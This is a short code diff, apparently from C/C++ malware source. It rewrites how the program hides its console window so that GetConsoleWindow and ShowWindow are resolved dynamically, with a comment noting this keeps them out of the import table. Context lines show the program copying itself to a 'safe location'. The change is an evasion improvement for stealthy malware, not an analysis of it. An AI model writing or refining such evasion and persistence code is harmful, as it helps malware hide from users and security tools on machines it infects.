@@ -7,15 +7,17 @@
 
 
 int main() {
-  
-  //hide console
-  HWND stealth = GetConsoleWindow();
-  ShowWindow(stealth, SW_HIDE);
 
   if (!ResolveAPIs())
     exit(0);
   
   API_TABLE& API = GetAPI();
+
+  //hide console (resolved dynamically — not in IAT)
+  if (API.GetConsoleWindow && API.ShowWindow) {
+    HWND stealth = API.GetConsoleWindow();
+    API.ShowWindow(stealth, 0); // SW_HIDE = 0
+  }
 
   //copy file to safe location
   if (safe_migrate()) {
